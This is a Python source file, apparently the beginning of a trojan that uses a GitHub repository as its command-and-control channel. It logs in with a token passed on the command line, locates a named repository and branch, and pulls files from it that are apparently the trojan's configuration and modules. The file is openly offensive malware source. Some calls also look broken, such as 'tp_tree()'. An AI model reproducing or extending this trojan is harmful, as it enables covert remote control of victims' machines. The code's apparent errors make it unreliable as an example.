import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules=[]
configured=False
task_queue=Queue.Queue()

token = sys.argv[1]

def connect_to_github():
    gh = login(token=token)
    repo = gh.repository("laurijssen", "blackhatpython")
    branch = repo.branch("master")

    return gh,repo,branch

def get_file_contents(filepath):
    gh,repo,branch=connect_to_github()
    tree=branch.commit.commit.tree.tp_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] found file %s" % filepath)
            blob = repo.blob(filename.__json_data['sha'])
            return blob.content

    return None

